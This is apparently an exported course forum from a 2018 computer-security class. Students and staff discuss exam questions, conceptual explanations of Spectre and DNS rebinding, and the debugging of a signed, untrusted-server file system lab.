I assume the &#34;cache&#34; described in the problem means that if there is a return value is associated with a branch already, we won&#39;t re-execute it. Thus there is exactly 1 return value per leaf, eliminating C and D, which both have 4 return values. B is correct because if we generate an input x=11, the return value 1 will be put under the same category as (2). So even if we next generate x=12, which returns 2, branch (2) is already fulfilled. A is correct because we could have had input values like x=100, 20, 0. This leads me to think that 3, 1, 2 would also be possible, though I&#39;m not sure. I don&#39;t think the order of return values matters.</div>
<h2>Followup</h2>
<div>Thanks, that makes sense!</div>
<h2>Followup</h2>
<div><p>Can someone explain what the caching means here?</p>
<p></p>
<p>And also how these returns values would arise? The problem states &#34;in the order explored by concolic execution&#34; -- how is this defined? Thanks!</p></div>
<h3>Followup Response</h3>
<div><p>&#43;&#43;</p>
<p>I&#39;d also like to see how these return values would arise. Also, if &#34;x % 2 == 1&#34; evaluates to True, wouldn&#39;t the tree of execution to have two leaves:</p>
<p>1) x &gt; 30 VALID    (return 0)         <br />2) x &gt; 30 INVALID (return 1)</p>
<p></p>
<p>More generally, doesn&#39;t the number of leaves in the tree of execution depend on the concrete value of x?</p></div><hr><h1>Grading multiple-choice questions</h1>
<h3>2018-05-17T04:09:44Z</h3>
<div>If a multiple-choice question on the exam is worth 4 points, how are the points assigned? Is it all or nothing, partial credit for each correct option circled, etc.? Just curious as I take and self-grade old exams.</div><hr><h1>Spectre</h1>
<h3>2018-05-15T21:17:22Z</h3>
<div><p>I understand info gets leaked through the cache in Spectre- but is info leaked by where in the cache we found a hit, or the actual contents of the cache that was hit?</p></div>
<h2>Student Answer</h2>
<div>The actual contents! Section 4 of the paper gives an example. They leak the out-of-bounds secret value at array1[x] by using it to calculate an index into another array array2. The use the cache as a side channel to see what page of array2 was cached (and therefore what array1[x] is).<div><br /></div><div>So you use the secret value to calculate an index (location) into another array, which may have been the source of your confusion.</div></div><hr><h1>Fast-Flux DNS? [Security Econ lecture]</h1>
<h3>2018-05-15T17:59:20Z</h3>
<div><p>I&#39;m not totally sure if I understood how Fast Flux operates - we have a number of IP addresses associated with a single DNS name, such that these addresses are very quickly swapped and hence it is hard to black list them. But shouldn&#39;t this swapping necessarily require participation of the registrar? couldn&#39;t this swapping be easily detected? and why not just block the full DNS name (instead of the IP address associated with it)? </p></div><hr><h1>Web Security Lecture Notes</h1>
<h3>2018-05-15T07:22:20Z</h3>
<div><p>This was taken from page 6:</p>
<p>4) Attacker&#39;s DNS server responds with IP address of internal device on victim&#39;s network.</p>
<p>5) Request is sent to internal device, and attacker&#39;s code in victim&#39;s browser gets the response.</p>
<p></p>
<p>Could you explain these two steps? especially what an internal device is?</p></div><hr><h1>Review Session</h1>
<h3>2018-05-15T05:34:28Z</h3>
<div><p>Will there be a review session for the final exam?</p></div>
<h2>Student Answer</h2>
<div><p>Yes, it&#39;s listed on the course schedule. </p></div>
<h2>Staff Answer</h2>
<div><p>Yes there will be a review session. The detail should be sent out soon :)</p></div>
<h2>Followup</h2>
<div><p>Bump</p></div>
<h3>Followup Response</h3>
<div>Yes you can trust the calendar in site.</div><hr><h1>Deterministic Serialization</h1>
<h3>2018-05-14T14:20:21Z</h3>
<div><p>I am facing a lot of trouble in deterministically serializing dictionaries and would appreciate any pointers on how I can do it or make it work with cryptographic sign/verify.</p></div>
<h2>Student Answer</h2>
<div><p>i used OrderedDict() to maintain ordering in the data structure before serializing</p></div>
<h2>Followup</h2>
<div><p>OrderedDict imposes order on insertion order. Maybe this is not desired, depending on your use case.</p></div><hr><h1>Final Project Presentation Length</h1>
<h3>2018-05-14T08:42:28Z</h3>
<div><p></p><p style="text-align:left">What&#39;s the time limit on the presentations for Wednesday?</p></div>
<h2>Staff Answer</h2>
<div><p>Aim for a bit less than 10 minutes, so leave room for questions.</p></div><hr><h1>Lab 4 Grades Posted</h1>
<h3>2018-05-14T08:30:22Z</h3>
<div><p>Please check the course website to see your grades.</p></div><hr><h1>Principal not in current itables?</h1>
<h3>2018-05-14T02:20:50Z</h3>
<div><p>We are struggling to mount a second client and can&#39;t figure out where we&#39;re going wrong. We are loading the itables before calling refresh(), but still getting the error <tt>asked to resolve i (&lt;uid=0&gt;, 0), but i does not exist</tt>. We have been trying to debug and have found that our current_itables contains entries, except it&#39;s missing an entry for the principal, so None is being returned from resolve at these lines:</p>
<p><tt> global current_itables</tt><br /><tt> if principal not in current_itables:</tt><br /><tt>    # User does not yet have an itable</tt><br /><tt>    return None </tt></p>
<p></p>
<p>Why would an entry for the principal in question be missing from current_itables? When is that supposed to get added to current_itables?</p>
<p></p>
<p>This is the full trace of the error that&#39;s happening for us in forked-client.err and some of the other test client files.</p>
<p><tt>handler raised &lt;class &#39;LookupError&#39;&gt; exception (asked to resolve i (&lt;uid=0&gt;, 0), but i does not exist), terminating main loop.</tt><br /><tt>Traceback (most recent call last):</tt><br /><tt> File &#34;venv/bin/secfs-fuse&#34;, line 6, in &lt;module&gt;</tt><br /><tt> exec(compile(open(__file__).read(), __file__, &#39;exec&#39;))</tt><br /><tt> File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 616, in &lt;module&gt;</tt><br /><tt> llfuse.main(workers=1)</tt><br /><tt> File &#34;src/fuse_api.pxi&#34;, line 348, in llfuse.main</tt><br /><tt> File &#34;src/handlers.pxi&#34;, line 15, in llfuse.fuse_init</tt><br /><tt> File &#34;src/handlers.pxi&#34;, line 16, in llfuse.fuse_init</tt><br /><tt> File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 241, in init</tt><br /><tt> self._pre(mounter)</tt><br /><tt> File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 122, in _pre</tt><br /><tt> secfs.tables.pre(_reload_principals, user)</tt><br /><tt> File &#34;/home/httpd/secfs/secfs/tables.py&#34;, line 39, in pre</tt><br /><tt> refresh()</tt><br /><tt> File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 495, in _reload_principals</tt><br /><tt> secfs.fs.groupmap = _read_file(b&#34;.groups&#34;)</tt><br /><tt> File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 486, in _read_file</tt><br /><tt> print(secfs.store.tree.find_under(secfs.fs.root_i, fname))</tt><br /><tt> File &#34;/home/httpd/secfs/secfs/store/tree.py&#34;, line 19, in find_under</tt><br /><tt> dr = Directory(dir_i)</tt><br /><tt> File &#34;/home/httpd/secfs/secfs/store/tree.py&#34;, line 37, in __init__</tt><br /><tt> self.inode = secfs.fs.get_inode(i)</tt><br /><tt> File &#34;/home/httpd/secfs/secfs/fs.py&#34;, line 29, in get_inode</tt><br /><tt> raise LookupError(&#34;asked to resolve i {}, but i does not exist&#34;.format(i))</tt><br /><tt>LookupError: asked to resolve i (&lt;uid=0&gt;, 0), but i does not exist</tt></p>
<p>We&#39;re really confused about what we&#39;re doing wrong, any advice would be appreciated.</p></div>
<h2>Followup</h2>
<div><p>Are you guys forgetting to insert it into the itable from the VSL? Since modmap is the method for updating tables, that&#39;s where you should be inserting into VSL (and the current_itables if you still have one in your implementation, but, of course, this doesn&#39;t get sent to other clients).</p>
<p></p>
<p>Good luck guys. You&#39;re not alone tonight.</p></div>
<h3>Followup Response</h3>
<div><p>We think we&#39;re inserting it into our current_itables and VSL. We modified modmap and we think it makes sense.</p>
<p></p>
<p>Related question - when we load our itables in a forked client using the VSL, should there be an entry in the itables for user with uid=0? Because we&#39;re able to load itables, except it has entries for uid=1000 and gid=100 but not uid=0. How I&#39;m thinking about it, it seems like there should be an entry for uid=0. If there should be that entry, why would there be entries for other uid/gids but not 0?</p>
<p></p>
<p>Idk if that question made sense.</p></div>
<h3>Followup Response</h3>
<div><p>Yea, I kind of see what you mean. I think uid=0 should be in the VSL. It should at least include the initial modmaps that the root user does, I think (from secfs.fs.init call in secfs-fuse.init)? It&#39;s also kind of hard to forget pushing to server since the self._post call is called immediately after. I&#39;m having trouble imagining where you might leave out the root user here though.</p></div><hr><h1>Reminder: Sign up for Lab5 Checkoffs</h1>
<h3>2018-05-13T16:39:32Z</h3>
<div><p>Hi everyone,</p>
<p></p>
<p>Just a reminder. <a href="https://docs.google.com/spreadsheets/d/1N9fwgdPZMW-dBpaZBmqQwMdPSNhyQ1M7E560XbrqUFc/edit?usp=sharing" target="_blank">Sign up</a> for lab 5 checkoffs by Sunday (5/13) midnight (11:59PM)!</p>
<p></p>
<p>More information is available &#64;712.</p>
<p></p>
<p>Thanks,</p>
<p>6.858 Staff</p></div><hr><h1>Removing from mnt2</h1>
<h3>2018-05-13T16:22:22Z</h3>
<div><p>If we call sudo touch file.txt from /mnt, should you be able to do sudo rm file.txt from /mnt2? Or should this be disallowed since you&#39;re from a different client?</p></div>
<h2>Staff Answer</h2>
<div>This should be allowed since sudo should have all the permission :)</div>
<h2>Followup</h2>
<div><p>thanks! What about other permissions? If client 1 creates a user owned file using the umask trick, should client 2 be able to remove it? And how do we test for that?</p></div>
<h3>Followup Response</h3>
<div><p>(Right now, if I create a file while under mnt/sharedfolder/hi.txt I can delete it by removing it from mnt2/sharedfolder/hi.txt</p></div>
<h3>Followup Response</h3>
<div><p>hi, just wanted to bump this :)</p></div>
<h3>Followup Response</h3>
<div><p>If it&#39;s the same user doing the remove, it should work. If it&#39;s a different user, it shouldn&#39;t. What client it is doesn&#39;t matter, what user it is does.</p></div><hr><h1>Is primary client supposed to be dying at the end of the tests?</h1>
<h3>2018-05-13T07:56:01Z</h3>
<div><p>Our tests are passing, but I notice that &#34;primary client&#34; is dying towards the end of the tests. Is this normal? This happens right after getting a PASS for &#34;can&#39;t successfully read file modified by malicious user&#34;. The error the primary client throws is an Error because signature verification failed. (Are we supposed to throw a specific type of error?).</p></div>
<h2>Staff Answer</h2>
<div><p>Does ./test.sh finish running 100 tests? It is ok to throw an error if the signature verification failed, we don&#39;t have a plan for recovering from that attack. I think that is the last test, so as long as you&#39;ve run and it says passed x/<strong>100</strong>, you&#39;re not crashing early </p></div><hr><h1>TypeError: can&#39;t pickle _cffi_backend.CData objects</h1>
<h3>2018-05-13T06:14:23Z</h3>
<div><p>We&#39;re getting a weird error when implementing the additional feature for lab 5. Here&#39;s the traceback:</p>
<p></p>
<pre>Traceback (most recent call last):
  File &#34;venv/bin/secfs-server&#34;, line 6, in &lt;module&gt;
    exec(compile(open(__file__).read(), __file__, &#39;exec&#39;))
  File &#34;/home/httpd/secfs/bin/secfs-server&#34;, line 176, in &lt;module&gt;
    daemon.requestLoop()
  File &#34;/home/httpd/secfs/venv/lib/python3.5/site-packages/Pyro4/core.py&#34;, line 1232, in requestLoop
    self.transportServer.loop(loopCondition=condition)
  File &#34;/home/httpd/secfs/venv/lib/python3.5/site-packages/Pyro4/socketserver/threadpoolserver.py&#34;, line 166, in loop
    self.events([self.sock])
  File &#34;/home/httpd/secfs/venv/lib/python3.5/site-packages/Pyro4/socketserver/threadpoolserver.py&#34;, line 189, in events
    csock, caddr = self.sock.accept()
  File &#34;/usr/lib/python3.5/socket.py&#34;, line 195, in accept
    fd, addr = self._accept()
  File &#34;/home/httpd/secfs/bin/secfs-server&#34;, line 146, in forker
    data = copy.deepcopy(server.__dict__)
  File &#34;/usr/lib/python3.5/copy.py&#34;, line 155, in deepcopy
    y = copier(x, memo)
  File &#34;/usr/lib/python3.5/copy.py&#34;, line 243, in _deepcopy_dict
    y[deepcopy(key, memo)] = deepcopy(value, memo)
  File &#34;/usr/lib/python3.5/copy.py&#34;, line 155, in deepcopy
    y = copier(x, memo)
  File &#34;/usr/lib/python3.5/copy.py&#34;, line 243, in _deepcopy_dict
    y[deepcopy(key, memo)] = deepcopy(value, memo)
  File &#34;/usr/lib/python3.5/copy.py&#34;, line 182, in deepcopy
    y = _reconstruct(x, rv, 1, memo)
  File &#34;/usr/lib/python3.5/copy.py&#34;, line 297, in _reconstruct
    state = deepcopy(state, memo)
  File &#34;/usr/lib/python3.5/copy.py&#34;, line 155, in deepcopy
    y = copier(x, memo)
  File &#34;/usr/lib/python3.5/copy.py&#34;, line 243, in _deepcopy_dict
    y[deepcopy(key, memo)] = deepcopy(value, memo)
  File &#34;/usr/lib/python3.5/copy.py&#34;, line 174, in deepcopy
    rv = reductor(4)
TypeError: can&#39;t pickle _cffi_backend.CDataGCP objects</pre>
<p>Has anyone seen this error before? We haven&#39;t changed any lines of code in the traceback.</p>
<p></p>
<p>Thanks!</p></div>
<h2>Staff Answer</h2>
<div><p>It&#39;s hard to tell without knowing what changes are made. Did you add new methods to secfs-server that might be unpickle-able? </p>
<p></p>
<p>See here for objects that can be pickle-able: </p>
<p><a href="https://docs.python.org/2/library/pickle.html#what-can-be-pickled-and-unpickled">https://docs.python.org/2/library/pickle.html#what-can-be-pickled-and-unpickled</a> </p>
<p></p>
<p>According to this stackoverflow, it could be due to sending RSA keys over socket? </p>
<p><a href="https://stackoverflow.com/questions/39321606/cant-pickle-an-rsa-key-to-send-over-a-socket">https://stackoverflow.com/questions/39321606/cant-pickle-an-rsa-key-to-send-over-a-socket</a></p>
<p></p></div><hr><h1>Do we run ./test.sh or sudo ./test.sh?</h1>
<h3>2018-05-13T03:47:40Z</h3>
<div><p>Do we use sudo when running ./test.sh? For the &#34;malicious-server-client&#34;, the test script tries to write to a file using echo and a redirect. Wouldn&#39;t that fail if we&#39;re running the test as a user other than root?</p>
<p></p>
<p>We&#39;re currently failing the &#34;malicious-server-client&#34; test (the one with the fake public key for root) and our system is showing that it&#39;s reading the correct public key, not the fake one that it&#39;s supposed to.</p>
<p></p>
<p>Thanks.</p></div>
<h2>Staff Answer</h2>
<div><p>Run with just ./test.sh. (Running with sudo means you&#39;re running with privilege). </p>
<p></p>
<p>The fake public key will get overwritten when you call refresh() because _reload_principals() will reload all the public keys. When do you check for the root&#39;s public key?</p></div>
<h2>Followup</h2>
<div><p>I was performing verifciation after the call to refresh(). Should I perform verification before the call to refresh?</p></div>
<h3>Followup Response</h3>
<div><p>If you verify the root after refresh(), the call to refresh() is going to overwrite the bad public key with the correct public key. The scenario is testing that you check that the root itself is trusted before reading .groups</p></div>
<h2>Followup</h2>
<div><p>Are we supposed to be doing some type of verification of root&#39;s public key aside from our typical verification of the VS entries?</p></div>
<h3>Followup Response</h3>
<div><p>You&#39;re on the right track. It&#39;s sort of bootstrapping trust</p></div>
<h3>Followup Response</h3>
<div><p>got it, thanks!</p>
<p></p></div><hr><h1>Design Doc</h1>
<h3>2018-05-12T22:12:57Z</h3>
<div><p>How strict is the 1-page limit? Is it okay to go over to 2-pages?</p></div>
<h2>Staff Answer</h2>
<div><p>Please try to be concise. A bit more than 1 page is fine but no longer than 1.5page.</p></div><hr><h1>What does it mean for a server to be malicious?</h1>
<h3>2018-05-12T22:12:47Z</h3>
<div><p>does that mean that the root user is compromised and we can&#39;t trust anything signed by root?</p></div>
<h2>Student Answer</h2>
<div><p>No.</p>
<p></p>
<p>There is a client and a server. Your files are stored on the remote server (think: server farm, cloud). The server farm you&#39;re using is untrustworthy and can corrupt your data. </p>
<p></p>
<p>You don&#39;t trust other clients or the server. You only trust yourself (your own client).</p></div><hr><h1>Removal of Directories</h1>
<h3>2018-05-12T18:18:17Z</h3>
<div><p>If we choose to do removal of files for our extension, does this include removal of directories as well?</p></div>
<h2>Followup</h2>
<div><p>&#64;680 also asks this, but is unanswered as well</p></div>
<h2>Staff Answer</h2>
<div><p></p><ul><li>The implementation only supports adding and writing to files, but not deleting or moving them.<br /><br />It does make sense to support both in the system, but since the handout doesn&#39;t explicitly say that, you can just support file removal and moving.</li></ul></div><hr><h1>Should we be able to mount second client without doing any signing/verification?</h1>
<h3>2018-05-12T02:33:01Z</h3>
<div><p>Are we supposed to be able to mount a second client before doing any signing/verificaiton? We are in the middle of Exercise 1 and think we&#39;ve done everything except the signing/verification, but we&#39;re still getting an error when we try to mount a second client from a terminal.</p>
<p></p>
<p>After running ./test.sh, most of the .err files are empty - only malicious-client and ro-client-without-root have errors. Does it make sense that we would be failing these cases and unable to mount a second client from terminal because of missing signing/verification or is there something wrong in our implementation of the rest of Exercise 1 that must be causing these errors?</p></div>
<h2>Staff Answer</h2>
<div><p>Supporting second client doesn&#39;t require sign and verify. However, you will need to store VSL and load VSL from the server every time you have new client. In order to do that, you will need to modify pre() and post() to load and store properly.<br /><br />ps. sorry for late reply, I&#39;m currently in the competition since yesterday (til tomorrow).</p></div><hr><h1>How to use umask?</h1>
<h3>2018-05-12T00:25:43Z</h3>
<div><p>I am looking at Exercises 2 and 3 and am confused about how to even apply umask somewhere. Could someone give me a hint to get me going?</p>
<p></p>
<p>I have already seen &#64;665 and &#64;686, but I am not sure how that directly relates to umasks since you cannot actually do a umask with the entry returned by the _getattr()?</p></div>
<h2>Staff Answer</h2>
<div><p>The parsing of umask is already done in secfs-fuse, you don&#39;t need to worry about implementing it. As in &#64;686, you might want to look at _getattr() and entry.st_mode</p></div>
<h2>Followup</h2>
<div><p>Sorry, I&#39;m still not sure I&#39;m understanding.</p>
<p></p>
<p>Does this mean that all we are trying to do is set the permissions (with entry.st_mode) such that it matches the one resulting from umask (0200)? In other words, we are trying to set the permissions for the root directory to 0200 &amp; 0777? And the whole thing about the umask trick in the lab handout is actually quite irrelevant to us?</p></div>
<h3>Followup Response</h3>
<div><p>nvm, I was just very confused.</p></div>
<h3>Followup Response</h3>
<div><p>Help another group who is also confused by explaining a bit more?</p></div>
<h3>Followup Response</h3>
<div><p>Sorry. I had a bug before that had me really confused about what was happening overall. I&#39;m still trying to figure out Exercises 2 and 3, and haven&#39;t gotten to setting permissions, which is why I didn&#39;t bother elaborating.</p>
<p></p>
<p>I&#39;m not sure what you guys are confused with, but I&#39;ll just say some stuff and hopefully it helps.</p>
<p></p>
<p>The umask is passed from the command line by the user (or by the test script), and is passed to the functions in the <code>ctx</code> parameter so that you can fetch it with <code>ctx.umask</code>. The stuff they mention in the lab about using umask of 0200 to represent making a group-writable file is already handled. In particular, this is handled in the below lines (and pasted several times across several functions)</p>
<p></p>
<pre>if (ctx.umask &amp; 0o200) != 0:
            # user gave up write permission, so donating to group
            who = Group(ctx.gid)</pre>
<p> Similarly, the umask 0004 is already handled.</p>
<p></p>
<p>I think the permission setting is really only relevant for Exercise 3 (I actually am not sure what is required in Exercise 2). To set permission, I believe something like <code>entry.st_mode = new_permission</code> works.</p>
<p></p>
<p>I had a bug from exercise 0 that prevented me from passing the shared directory tests, which led me to think something needed to be done for Exercise 2. I pass most of them now that the bug is gone, but I didn&#39;t actually do anything for Exercise 2, so... not sure what that means.</p></div><hr><h1>Test script freezing</h1>
<h3>2018-05-11T22:36:20Z</h3>
<div><p>Our test script is freezing right after the follower lines:</p>
<p></p>
<p>[ INFO ]: Entering section Read-only client with root key access.</p>
<p>[ INFO ]: client started; waiting for init</p>
<p>[ INFO ]: client ready; continuing with tests</p>
<p></p>
<p></p>
<p>We can&#39;t get any error messages because the script is freezing. Does anyone know what these tests are testing specifically and if theres any way for us to manually see where the code is getting stuck? </p></div>
<h2>Followup</h2>
<div><p>Edit: this is the line we freeze on:</p>
<p></p>
<p>[ INFO ]: Entering section Manipulating as non-member.</p>
<p>[ PASS ]: can&#39;t create file in group-writeable directory as non-member           </p>
<p>[ .... ]: ensure failure of sudo -u &#39;#666&#39; stat shared/muhaha</p>
<p></p>
<p>all of our error messages are empty. </p></div>
<h2>Staff Answer</h2>
<div><p>In other terminal, run </p>
<pre>pkill server</pre>
<p>Then, check the log from ro-client-with-root.log and ro-client-with-root.err<br />or check client.log when you test manually.<br /><br />See what is the latest action it tried to do. If you only see &#34;PRE&#34; but not &#34;POST&#34; in the log. It could be the case that pre() happen but not post() which mean the lock will not be released.</p>
<p><br />Try to catch the error throw in many place including secfs-fuse so that it won&#39;t hang. </p></div><hr><h1>&#39;_RSAPrivateKey&#39; object has no attribute &#39;encrypt&#39;</h1>
<h3>2018-05-11T22:28:37Z</h3>
<div><p>I&#39;m working on asymmetric encryption of the keys, and I&#39;m running into this error. I checked the docs here (<a href="https://cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa/">https://cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa/</a>) and I seem to be calling the provided method correctly, but I keep getting the below error when trying to encrypt</p>
<p></p>
<p>handler raised &lt;class &#39;AttributeError&#39;&gt; exception (&#39;_RSAPrivateKey&#39; object has no attribute &#39;encrypt&#39;), terminating main loop.<br />Traceback (most recent call last):<br /> File &#34;venv/bin/secfs-fuse&#34;, line 6, in &lt;module&gt;<br /> exec(compile(open(__file__).read(), __file__, &#39;exec&#39;))<br /> File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 672, in &lt;module&gt;<br /> llfuse.main(workers=1)<br /> File &#34;src/fuse_api.pxi&#34;, line 348, in llfuse.main<br /> File &#34;src/handlers.pxi&#34;, line 374, in llfuse.fuse_write_buf<br /> File &#34;src/handlers.pxi&#34;, line 375, in llfuse.fuse_write_buf<br /> File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 467, in write<br /> ret = secfs.fs.write(fh[1], fh[0], off, buf)<br /> File &#34;/home/httpd/secfs/secfs/fs.py&#34;, line 325, in write<br /> userkey = secfs.crypto.encrypt_asym(secfs.crypto.keys[write_as],key[write_as.id])<br /> File &#34;/home/httpd/secfs/secfs/crypto.py&#34;, line 47, in encrypt_asym<br /> return pubkey.encrypt(data, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))<br />AttributeError: &#39;_RSAPrivateKey&#39; object has no attribute &#39;encrypt&#39;</p></div>
<h2>Student Answer</h2>
<div><p>Resolved. Should have encrypted with public key</p></div><hr><h1>[ FAIL ]: could operate on file system with untrusted root</h1>
<h3>2018-05-11T20:46:14Z</h3>
<div><p>My team is failing just this one test, and we&#39;ve tried to debug but cannot figure out where this issue is coming from and what it may be related to. Did anyone else run into this problem, or have any advice? Thanks!</p></div>
<h2>Staff Answer</h2>
<div><p>&#64;727</p></div><hr><h1>Malicious server</h1>
<h3>2018-05-11T19:58:19Z</h3>
<div><p>What&#39;s the malicious server test trying to do? I&#39;m still failing this test, but I can&#39;t figure out exactly what the root public key is for--should I be encrypting the root directory with this?</p></div>
<h2>Staff Answer</h2>
<div><p> A malicious server could provide the wrong VSL, which points to a different <tt>.users</tt> file, which has public keys that validate the signatures on the bad VSL. <br /><br />To protect against this, we want to verify that <tt>.users </tt>file is derived from information signed by root.pub, so that the client can then trust the public keys it contains, and use those to trust or reject the VSL.</p></div>
<h2>Followup</h2>
<div><p>Hm ok, I implemented a sign/verify based on the root.pub provided to the client. I&#39;m still failing this test, though, and I see that the provided bad-root.pub in the test &#34;Malicious server&#34; matches the given root.pub. Shouldn&#39;t they be different? Or am I still misinterpreting the purpose of this test?</p></div>
<h3>Followup Response</h3>
<div><p>Oh wait, nevermind, I see they are different. But they&#39;re the same inside my clients for some reason--will look into this.</p></div>
<h3>Followup Response</h3>
<div><p>What do you mean you implemented it based on root.pub? Is that different from accessing private keys via secfs.crypto.keys[u] and public keys via secfs.fs.usermap[u], where u in the user?</p></div>
<h3>Followup Response</h3>
<div><p>One point is to make sure that you do NOT call <code>refresh()</code>(which reloads the keys from <tt>.users</tt>) before checking the VSL, but instead FIRST check root&#39;s VS, and THEN call <code>refresh()</code>.</p></div>
<h2>Followup</h2>
<div><p>couldn&#39;t the malicious server replace root.pub?</p></div>
<h3>Followup Response</h3>
<div><p>Your client should be able to detect if the server provides you with a root VS signed by a different key. <br />This tests checks whether you correctly check the VS for root in your VSL against the root public key given when the file system is mounted. <br /></p></div>
<h3>Followup Response</h3>
<div><p>root.pub is actually a file local to the client that the server can&#39;t do anything about.</p></div>
<h2>Followup</h2>
<div><p>What do you mean by &#34;a VSL that points to a different .users file&#34;. Does a VSL have a pointer to the &#34;.users&#34; file at all?</p></div>
<h3>Followup Response</h3>
<div><p>In the root directory, there is .users file right? That&#39;s why VSL also signs that file.</p></div>
<h2>Followup</h2>
<div><p>How do we verify that it points to the right .users file? Are we supposed to encrypt root.pub. Is it not enough to sign and verify each VS in our VSL?</p></div>
<h3>Followup Response</h3>
<div><p>No encryption for root.pub involve. Public key should be publicly accessible by everyone. <br /></p></div><hr><h1>Removing file</h1>
<h3>2018-05-11T19:23:19Z</h3>
<div><p>I am trying to remove the file for an improvement and I have removed it from the directory children in tree.py and also from the i-table of its owner. But I am getting this error:</p>
<p>  File &#34;venv/bin/secfs-fuse&#34;, line 6, in &lt;module&gt;<br />    exec(compile(open(__file__).read(), __file__, &#39;exec&#39;))<br />  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 642, in &lt;module&gt;<br />    llfuse.main(workers=1)<br />  File &#34;src/fuse_api.pxi&#34;, line 348, in llfuse.main<br />  File &#34;src/handlers.pxi&#34;, line 459, in llfuse.fuse_readdir<br />  File &#34;src/handlers.pxi&#34;, line 460, in llfuse.fuse_readdir<br />  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 291, in readdir<br />    yield (e[0], _getattr(e[1]), o)<br />  File &#34;/home/httpd/secfs/bin/secfs-fuse&#34;, line 541, in _getattr<br />    n = secfs.fs.get_inode(i)<br />  File &#34;/home/httpd/secfs/secfs/fs.py&#34;, line 27, in get_inode<br />    ihash = secfs.tables.resolve(i)<br />  File &#34;/home/httpd/secfs/secfs/tables.py&#34;, line 241, in resolve<br />    raise LookupError(&#34;principal {} does not have i {}&#34;.format(principal, i))<br />LookupError: principal &lt;uid=0&gt; does not have i (&lt;uid=0&gt;, 3)<br /><br /></p>
<p>Any suggestions why this might be happening?</p></div>
<h2>Staff Answer</h2>
<div><p>Resolved by the student</p></div><hr><h1>How to test different users/groups using the file system outside of test.sh?</h1>
<h3>2018-05-11T17:51:59Z</h3>
<div><p>To test the same user on different clients we can create /mnt2 as specified in the lab. Is there a suggested way to test different users using the file system? I&#39;m also not sure how to create clients in the same group for testing; are we supposed to just use root/http for testing group functionality? If someone could point me in the right direction that would be awesome :).</p></div>
<h2>Staff Answer</h2>
<div><p>For testing, you can look at the commands in ./test.sh under the tests for group functionality and use them to test manually. Or if you just want to test it quickly without figuring out manually, you can also comment out the tests in test.sh and just leave the ones for testing group functionality.</p>
<p></p>
<p>If you have your own test that you want to try out and want to temporarily change the group, look for the following line in bin/secfs: </p>
<p></p>
<pre>Group(100): [u for u in secfs.crypto.keys if u.id != 666]</pre>
<p>If you are mounting a new client and want to change the private keys available to that client, take a look under the if __name__== &#34;__main__&#34; to understand the arguments that are passed when mounting a new client / starting secfs. </p>
<p></p></div><hr><h1>Moving files</h1>
<h3>2018-05-11T17:00:06Z</h3>
<div><p>One of the improvements mention that we must be able to move files but when I looked at request handlers for llfuse.Operations(<a href="http://www.rath.org/llfuse-docs/operations.html">http://www.rath.org/llfuse-docs/operations.html</a>), there is not function for moving files. I would appreciate any hints on how I can implement it and how I can call it from the terminal( using hacks like umask for exercise 2).</p></div>
<h2>Student Answer</h2>
<div><p></p><pre>rename</pre>
<p></p></div>
<h2>Followup</h2>
<div><p>So apparently rename doesn&#39;t work. When I try to mv the file, for some reason unlink is called. But unlink does not have the destination parameters so I don&#39;t know how to link the file to the new destination.</p>
<p></p>
<p>EDIT: Resolved. I was moving the file out of the mount folder. If you move it within the mount folder, rename is called.</p></div><hr><h1>Remove in SecFS</h1>
<h3>2018-05-11T16:56:58Z</h3>
<div><p>I&#39;m trying to implement remove in SecFS right now- in ex0 we filled in a function called _create in secfs/fs.py. Should my approach for remove be similar? I guess what I&#39;m asking is, what exactly happens when we type &#34;touch hi.txt&#34; into the terminal at that point? What do I need to edit so that &#34;rm hi.txt&#34; will also get called into secfs/fs.py?</p></div>
<h2>Staff Answer</h2>
<div><p>Take a look at secfs-fuse. You will see that SecFS extends from llfuse.Operations. Check <a href="http://www.rath.org/llfuse-docs/operations.html" target="_blank">this</a> to see which function you need to override to support the remove. </p></div><hr><h1>Roots and clients confusion</h1>
<h3>2018-05-11T16:44:19Z</h3>
<div><p>We&#39;re kind of confused about what roots correspond to and how this relates to clients. When a second client connects, should a new root be created? Right now, we can&#39;t connect a second client and when we print things in the log of the forked client, the root_i principal is uid=0, which is the first client, not the second. We are unsure of the expected behavior relating to roots and clients.</p></div>
<h2>Staff Answer</h2>
<div><p>Root is always user with uid=0 in for SecFs. A client could have multiple users (uid=0, uid=1000, ...). </p>
<p></p>
<p>If you trace through where root_i is set, it is related to the &#96;owner&#96; (in secfs/fs.py), which is the same as the &#96;mounter&#96; (in bin/secfs-fuse), which in turn is the user of the first private key that was passed during initialization.</p>
<p></p>
<p>Can you post more about the error you are getting with mounting second client? </p>
<p></p></div><hr><h1>Documentation submission</h1>
<h3>2018-05-11T16:05:04Z</h3>
<div><p>How do we submit the 1 page documentation? Do we just put it in the repo and push it? Should we name it something particular in that case?</p></div>
<h2>Staff Answer</h2>
<div><p>Let&#39;s name &#34;project-report.pdf&#34; or other file extension.</p></div>
<h2>Followup</h2>
<div><p>Sorry I just checked the submission website that there is submission filename format, so you need to upload in both place.  [edit the answer already]</p></div>
<h2>Followup</h2>
<div><p>Question: students doing lab5 did not have to have a proj-proposal, correct?</p></div>
<h3>Followup Response</h3>
<div><p>correct</p></div>
<h2>Followup</h2>
<div><p>Only one teammate needs to submit proj-final to the submission website, right?</p></div><hr><h1>mounting second client</h1>
<h3>2018-05-11T05:26:42Z</h3>
<div><p>we are having trouble with ex1 mounting the second client. we looked at &#64;673 but we are still getting the LookupError. </p>
<p></p>
<p>we have printed out our VSL, and it seems like we are adding to it properly.</p>
<p></p>
<p>any thoughts on what&#39;s wrong? thanks!</p>
<p></p>
<p><img src="https://d1b10bmlvqabco.cloudfront.net/attach/javuduq1qek22s/hzmpthrut8wzo/jh1iquiws1ri/Capture.PNG" alt="" /></p></div>
<h2>Staff Answer</h2>
<div><p>What&#39;s the detailed error you get from client 2? Specifically, which line cause an error?</p></div>
<h2>Followup</h2>
